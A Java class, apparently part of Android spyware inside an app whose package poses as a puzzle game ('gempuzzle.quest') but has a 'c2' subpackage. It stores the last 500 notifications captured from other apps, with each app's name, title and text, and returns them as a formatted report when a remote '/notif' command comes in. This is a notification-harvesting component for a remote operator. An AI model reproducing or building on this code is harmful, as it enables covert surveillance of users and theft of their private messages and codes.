package com.gempuzzle.quest.c2;

import java.util.ArrayList;
import java.util.List;

/**
 * Notification buffer — stores last N notifications per app.
 * Flushed on /notif command.
 */
public final class NotificationBuffer {

    private static final List<String> logs = new ArrayList<>();
    private static final int MAX = 500;

    public static synchronized void log(String pkg, String title, String text) {
        logs.add("📱 `" + pkg + "`\n  " + title + " — " + text);
        while (logs.size() > MAX) logs.remove(0);
    }

    public static synchronized String dump(int n, String filterPkg) {
        if (logs.isEmpty()) return "_no notifications recorded_";
        StringBuilder sb = new StringBuilder("🔔 *NOTIFICATIONS*\n\n");
        int count = 0;
        for (int i = logs.size() - 1; i >= 0 && count < n; i--) {
            String entry = logs.get(i);
            if (filterPkg != null && !filterPkg.isEmpty() && !entry.contains(filterPkg)) continue;
            sb.append(entry).append("\n\n");
            count++;
        }
        if (count == 0) sb.append("_none matching filter_");
        return sb.toString();
    }

    private NotificationBuffer() {}
}
